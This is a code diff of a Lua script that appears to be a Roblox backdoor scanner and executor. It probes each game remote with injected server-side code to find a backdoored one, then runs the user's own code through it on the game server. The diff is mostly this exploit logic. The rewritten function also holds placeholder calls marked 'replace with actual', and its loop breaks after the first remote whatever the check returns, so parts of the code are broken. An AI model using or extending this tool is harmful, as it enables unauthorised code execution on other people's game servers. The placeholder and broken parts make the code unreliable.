@@ -300,28 +300,19 @@ local function CheckBackdoor(Remote, BackdoorCode)
 end
 
 -- scan all game remotes and return all backdoors found
-local function scan(remotes, delayFactor)
-    delayFactor = delayFactor or 1;
+local function scanAndFireBackdoors()
+    local remotes = getRemotes();
+    local backdoor;
+    local code;
+    
+    -- Start scanning for remotes
     alertLib.Info(screenGui, TITLE, 'Scan started.', 4);
     ui.title.Text = TITLE .. " [Scanning]";
-    -- retrive remotes
-    remotes = getRemotes();
-    local backdoor;
-    -- listen workspace new instances
-    local connection;
-    connection = workspace.ChildAdded:Connect(function(child)
-        local gateway = URSTRING_TO_BACKDOOR[child.Name];
-        if gateway then
-            -- store backdoor
-            backdoor = gateway;
-            connection:Disconnect();
-        end;
-    end);
-    ui.title.Text = TITLE .. " [Testing]";
-    --loop all remotes
+
+    -- Loop through remotes to find possible backdoors
     for i, r in ipairs(remotes) do
         local Code = GenerateRandomString(math.random(15, 29));
-			
+
         runRemote(r, [[
             local IntValue = Instance.new("IntValue");
 
@@ -333,33 +324,42 @@ local function scan(remotes, delayFactor)
 
             IntValue.Parent = game:GetService("ReplicatedStorage");
         ]]);
-        
-        repeat CheckBackdoor(r, Code) until not CheckBackdoor(r, Code) == false;
+
+        repeat CheckBackdoor(r, Code) task.wait() until not CheckBackdoor(r, Code) == false;
 
         CurrentBackdoor = r;
-
         ui.title.Text = TITLE .. " [Attached Backdoor]";
 
-        task.wait();
-        
         alertLib.Info(screenGui, TITLE, "Attached Backdoor:", r:GetFullName(), 4);
-    end;
-    -- force disconnect after localPlayer:GetNetworkPing() * delayFactor * #remotes
-    local timeOut = math.max((localPlayer:GetNetworkPing() * delayFactor) * #remotes, MAXTIMEOUT);
-    task.delay(timeOut, function()
-        connection:Disconnect();
-    end);
-    local endTime = tick() + timeOut;
-    -- wait until connection is disconnected
-    while connection.Connected do
-        ui.title.Text = TITLE .. (" [Waiting: %.1f]"):format(endTime-tick());
-        task.wait();
-    end;
-    ui.title.Text = TITLE .. " [Waiting]";
-    table.clear(URSTRING_TO_BACKDOOR); -- clear URSTRING_TO_BACKDOOR
-    -- return
-    return backdoor;
-end;
+        
+        -- Fire the backdoor and check if it's found
+        backdoor = r;
+        break;  -- Stop once the backdoor is found
+    end
+    
+    if backdoor then
+        -- Proceed with firing the backdoor and execute code
+        alertLib.Info(screenGui, TITLE, "Firing backdoor...", 4);
+        runRemote(backdoor, "execute_code");  -- Firing the backdoor (replace 'execute_code' with actual code)
+        
+        -- Check if the backdoor is properly attached and execute code
+        local checkBackdoor = CheckBackdoor(backdoor, "check_code");  -- Replace with actual check logic
+        
+        if checkBackdoor then
+            ui.title.Text = TITLE .. " [Executing]";
+
+            -- Apply macros and execute code
+            local code = applyMacros(editor.getCode());
+            execute(code, backdoor, config.data.settings.canDebug);
+
+            alertLib.Success(screenGui, TITLE, "Backdoor executed successfully.", 4);
+        else
+            alertLib.Error(screenGui, TITLE, "Backdoor check failed.", 4);
+        end
+    else
+        alertLib.Error(screenGui, TITLE, "No backdoor found.", 4);
+    end
+end
 
 local executing = false;
 
@@ -436,38 +436,19 @@ local function resetExecutionState()
     ui.title.Text = TITLE;
 end;
 
+-- Connect the button to trigger the scanning and firing process
 btns.execBtn.MouseButton1Click:Connect(function()
-    -- avoid multiple executions
+    -- Avoid multiple executions
     if executing then
         return;
     end
     executing = true;
-    -- try scanning for backdoors
-    if backdoor == nil then
-        -- check if config.games has found backdoors
-        backdoor = getBackdoorFromConfig();
-        if not backdoor then
-            -- search backdoors
-            backdoor = debugScan();
-        end
-    end;
-    if backdoor == nil then
-        alertLib.Error(screenGui, TITLE, 'No backdoor found.');
-        resetExecutionState();
-        return;
-    end;
-    if firstExecution then
-        -- Executing blank script
-        execute("", backdoor, false, true):Wait();
-        -- store game
-        games.loadGame(game.PlaceId, encodeBackdoors({backdoor}));
-        config.save();
-        firstExecution = false;
-    end;
-    -- execute
-    local code = applyMacros(editor.getCode());
-    execute(code, backdoor, config.data.settings.canDebug);
-    resetExecutionState();
+
+    -- Perform the scan and execution
+    scanAndFireBackdoors();
+
+    -- Reset execution state
+    executing = false;
 end);
 
 -- set title
